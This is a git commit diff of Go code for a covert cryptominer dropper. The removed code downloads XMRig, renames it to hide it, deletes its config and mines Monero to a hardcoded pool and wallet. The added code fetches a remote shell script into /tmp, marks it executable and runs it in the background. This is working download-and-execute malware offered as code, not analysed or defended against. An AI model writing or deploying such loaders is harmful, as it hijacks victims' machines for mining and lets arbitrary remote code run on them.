978be5fd377b7517280419164683fc8a8eb780c5
logical <atilalima569@gmail.com>
2026-07-10 17:00:50 -0500

    upp

--- down_vkzmn.go
+++ down_vkzmn.go
@@ -8,23 +8,24 @@ import  (
 "net/http"
 "io/ioutil"
 "fmt"
-"os/exec"
+//"os/exec"
 //"os"
 )
 
-//funcao para abaixa o vkzmn
- 
 
-var   url_vkzmn  string  =  "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
+               
+var   url_down   string  =  "https://github.com/atilabyte/IA/raw/refs/heads/main/down.sh"
 
 
-func  down_vk(){
+
+func  down_atila_vkzmn_sh() {
+
 
 
 req  := http.Client{}
 
 
-resp , err_get := req.Get(url_vkzmn)
+resp , err_get := req.Get(url_down)
 
 
 if  err_get   != nil {
@@ -36,7 +37,7 @@ return
 
 }
 
-vkzmn_bytes  , err_readall :=  ioutil.ReadAll(resp.Body)
+down_bytes  , err_readall :=  ioutil.ReadAll(resp.Body)
 
 if err_readall != nil {
 
@@ -46,19 +47,11 @@ return
 
 }
 
-ioutil.WriteFile("/tmp/vkzmn.tar.gz", vkzmn_bytes, 0777)
 
-vk_deco_gz_tar  :=  exec.Command  (
+ioutil.WriteFile("/tmp/atila_vkzmn.sh",  down_bytes ,  0777 )
 
-"sh", "-c" , "cd /tmp &&  gzip -df /tmp/vkzmn.tar.gz && tar -xf /tmp/vkzmn.tar " ) //extract xmrig
-  
-vk_deco_gz_tar.Run()
 
-rename :=  exec.Command("mv" , "/tmp/xmrig-6.26.0/xmrig" , "/tmp/xmrig-6.26.0/vkzmn") //rename xmrig 
 
-rename.Run()
-
-return 
 
 }
 
--- run_vkzmn.go
+++ run_vkzmn.go
@@ -17,7 +17,7 @@ import (
 
 func exec_vk (){
 
-_,  err_open := os.Open("/tmp/xmrig-6.26.0/vkzmn")
+_,  err_open := os.Open("/tmp/atila_vkzmn.sh")
 
 
 
@@ -25,70 +25,37 @@ if  err_open != nil {
 
 
 
-
-//fmt.Println("vkzmn nao encontrado")
-
-
-
-down_vk() //abaixe  o vkzmn  
-
-}  else  {
+fmt.Println("atila_vkzmn.sh  nao encontrado")
 
 
 
-//delete  config.json to parse   pool url  and addres wallet   via  argv [0] [1] etc
+down_atila_vkzmn_sh ()
 
-
-del :=  exec.Command("rm" , "/tmp/xmrig-6.26.0/config.json")
- 
-del.Run()
-
-
-                                     
-vk_run := exec.Command("/tmp/xmrig-6.26.0/vkzmn" , 
-
-
-"--url" , 
-
-
-"pool.supportxmr.com:3333", 
-
-"--user", 
-
-"4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy" , 
-
-"--pass" , 
-
-"vkzmn" ,  
-
-"--donate-level" ,
-
-"1",  
-                                                              
-
-)
-
-
-
- out  ,  err_co :=  vk_run.CombinedOutput()
-
-
-
-if  err_co != nil { 
-
-fmt.Print(err_co)
-
-return
-
-}
-
-
- 
-fmt.Println(string(out))
 
 return 
 
+}
+
+
+
+
+if  err_open == nil  {
+
+
+
+
+run_atila_vkzmn :=  exec.Command("sh"  , "-c"  ,  "/tmp/./atila_vkzmn.sh") //execute xmr_rig
+
+
+
+go run_atila_vkzmn.Run()
+
+
+
 
 }
+ 
+
+
 
 }
